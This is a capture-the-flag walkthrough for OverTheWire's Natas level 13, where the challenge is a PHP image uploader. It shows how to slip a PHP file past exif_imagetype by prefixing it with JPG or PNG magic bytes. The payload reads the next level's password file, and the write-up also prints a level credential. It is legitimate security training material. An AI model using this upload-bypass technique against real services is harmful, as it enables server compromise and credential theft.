# Level 13


URL : http://natas13.natas.labs.overthewire.org/

### Creds for this challenge 
natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY


## Solution
1. requirements

- natas12
- File signatures

This challenge looks exactly the same as the previous one `natas12`, we are dealing with an image uploader service, it provides us with a simple form to upload an image.  

Let's spot the difference between the previous and the current source code, what has changed!

```php
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image"; 
}
```

In this challenge we are using [exif_imagetype](http://php.net/manual/en/function.exif-imagetype.php) to check if it is an image or not.But this function does is check the magic number of the file (File Signature), to do that it reads the first bytes of the file to tell if its an image or not.

we can bypass this function by crafting a php file beginning with an image file signature (.jpg for example) then we concatenate a malicious command : **include '/etc/natas_webpass/natas14'** for example.  

`NOTE: if you want to do that using the png file signature. use this : 89 50 4E 47 0D 0A 1A 0A and not 89 50 4E 47`  

## how can we craft the file ? 

1. using JPG magic number

```bash
echo "\xff\xd8\xff\xe8 <? include '/etc/natas_webpass/natas14'; ?>" > exp.php
```

2. using PNG magicn number

```bash
echo "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A <? include '/etc/natas_webpass/natas14'; ?>" > exp.php
```



